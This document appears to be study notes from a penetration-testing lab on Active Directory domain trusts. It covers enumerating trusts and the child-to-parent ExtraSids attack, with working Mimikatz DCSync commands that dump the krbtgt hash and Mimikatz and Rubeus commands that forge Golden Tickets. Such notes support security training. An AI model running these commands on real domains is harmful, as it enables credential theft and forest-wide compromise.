# Domain Trusts Primer
## Enumerating Trust Relationships
#### Using Get-ADTrust

```powershell
Get-ADTrust -Filter *
```
#### Checking for Existing Trusts using Get-DomainTrust

```PowerShell
Get-DomainTrust
```
#### Using Get-DomainTrustMapping

```powershell
Get-DomainTrustMapping
```

From here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:
#### Checking Users in the Child Domain using Get-DomainUser

```PowerShell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

Another tool we can use to get Domain Trust is `netdom`
#### Using netdom to query domain trust

```powershell
netdom query /domain:inlanefreight.local trust
```
#### Using netdom to query workstations and servers

```PowerShell
netdom query /domain:inlanefreight.local workstation
```

# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

## SID History Primer
**What is it?** It is an Active Directory attribute that stores a user's previous SID

**SID History Injection:** 
- **How it works:** An attacker with high privileges in a domain (e.g., a compromised child domain) injects the SID of a high-privilege group (like `Enterprise Admins` from the parent domain) into the `sidHistory` attribute of an account they control.
- **Why it works:** When the user logs in, their access token includes all SIDs from their `sidHistory`. The system grants them the privileges associated with those SIDs.
- **Key Tool:** `Mimikatz` is mentioned as a tool capable of performing this injection.

## ExtraSids Attack - Mimikatz
This attack allows compromising the parent domain once the child domain has been compromised.
Within the same forest, the `sidHistory` property is respected due to the lack of **SID Filtering** protection. **SID Filtering** is a protection put in place to filter out authentication requests from a domain in another forest across a trust.

**Example:**
If a user in a child domain has their `sidHistory` set to the **Enterprise Administrators Group** (which only exists in the parent domain), they are treated as a member of this group, which allows administrative access to the entire forest.

In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain

**What  do we need to have after Child Domain Compromise?**
To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

```ad-info
The account `krbtgt` is used to encrypt/sign all Kerberos tickets granted within a given domain.
```

```ad-note
Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.
```
#### Obtaining the KRBTGT Account's NT Hash using Mimikatz

```powershell
mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt" "exit"
```
#### Using Get-DomainSID

```powershell
Get-DomainSID
```
#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
#### Creating a Golden Ticket with Mimikatz

```powershell
mimikatz.exe kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

## ExtraSids Attack - Rubeus
#### Creating a Golden Ticket using Rubeus

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
#### Performing a DCSync Attack

Perform **DCSync** using `mimikatz` normally.

